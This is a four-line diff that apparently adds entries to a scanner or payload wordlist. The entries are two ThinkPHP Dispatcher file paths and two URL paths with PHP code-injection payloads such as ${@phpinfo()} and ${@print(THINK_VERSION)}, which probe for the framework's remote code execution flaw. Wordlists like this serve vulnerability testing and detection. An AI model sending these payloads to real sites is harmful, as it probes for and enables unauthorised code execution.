@@ -1,0 +1,4 @@
+/ThinkPHP/Lib/Think/Util/Dispatcher.class.php
+/ThinkPHP/Lib/Core/Dispatcher.class.php
+/Module/Action/Param/${@phpinfo()}
+/module/aciton/param1/${@print(THINK_VERSION)}index.php/module/aciton/param1/${@function_all()}
